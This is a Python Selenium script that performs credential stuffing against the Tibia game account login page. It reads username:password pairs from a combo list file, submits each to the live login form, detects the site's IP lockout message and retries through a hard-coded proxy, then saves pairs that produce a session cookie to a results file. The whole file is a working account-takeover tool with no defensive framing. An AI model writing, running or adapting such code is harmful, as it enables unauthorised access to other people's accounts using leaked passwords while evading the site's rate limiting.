from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class Credential:
  def __init__(self, username, password):
    self.username = username
    self.password = password

def saveCredntialResultToFile(credential,fileName):
    f=open(fileName, "a+")
    f.write(credential.username + ":" + credential.password)
    f.close()

#getProxyFrom proxylist
def getProxy(idProxy):
    proxy=["91.203.5.175:443"]
    lenght = len(proxy)
    if lenght < idProxy:
        return proxy[idProxy]
    return proxy[0]


def getCredentialsFromFile():
    credentials = []
    f=open("TIBIA-MIX.txt", "r")
    f1 = f.readlines()
    for line in f1:
        result = line.split(':')
        username = result[0]
        password = result[1]
        crednetial = Credential(username,password)
        credentials.append(crednetial)
    
    f.close()
    return credentials

#default proxy
PROXY = "91.203.5.175:443"
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--proxy-server=%s' % PROXY)

isProxy = False
browser = None

credentials = getCredentialsFromFile()

def goWithProxy(credential,proxyId):
    proxy = getProxy(proxyId)
    browser = webdriver.Chrome(options=chrome_options)
    usernameStr = credential.username
    passwordStr = credential.password
    browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))

    username = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginname')))
    username.send_keys(usernameStr)
    password = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginpassword')))
    password.send_keys(passwordStr)

    signInButton = browser.find_element_by_class_name('ButtonText')
    signInButton.click()

    try:        
        errorMessage = browser.find_element_by_class_name('ErrorMessage')
        errorText = errorMessage.text
        print(errorText)
        ipBlockText = "Wrong account data has been entered from your IP address too often. You are unable to log in from this IP address for the next 30 minutes. Please wait."
        if ipBlockText in errorText:
            print("Block ip error")
            browser.quit()
            goWithProxy(credential,proxyId+1)
    except:
        print('Error Message not found')

    cookie = browser.get_cookie('SecureSessionID')

    #browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))

    if cookie != None:
        saveCredntialResultToFile(credential,"results.txt") 

for credential in credentials:
    if(isProxy):
        browser = webdriver.Chrome(options=chrome_options)
    else:
        browser = webdriver.Chrome()

    usernameStr = credential.username
    passwordStr = credential.password

    browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))

    username = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginname')))
    username.send_keys(usernameStr)
    password = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginpassword')))
    password.send_keys(passwordStr)
    current_url = browser.current_url
    #signInButton = WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.NAME, 'Login')))
    
    signInButton = browser.find_element_by_class_name('ButtonText')
    
    current_url = browser.current_url
    
    signInButton.click()
    try:        
        errorMessage = browser.find_element_by_class_name('ErrorMessage')
        errorText = errorMessage.text
        print(errorText)
        ipBlockText = "Wrong account data has been entered from your IP address too often. You are unable to log in from this IP address for the next 30 minutes. Please wait."
        if ipBlockText in errorText:
            print("Block ip error")
            browser.quit()
            goWithProxy(credential,0)
    except:
        print('Error Message not found')

    cookie = browser.get_cookie('SecureSessionID')

    #browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))

    if cookie != None:
        saveCredntialResultToFile(credential,"results.txt") 
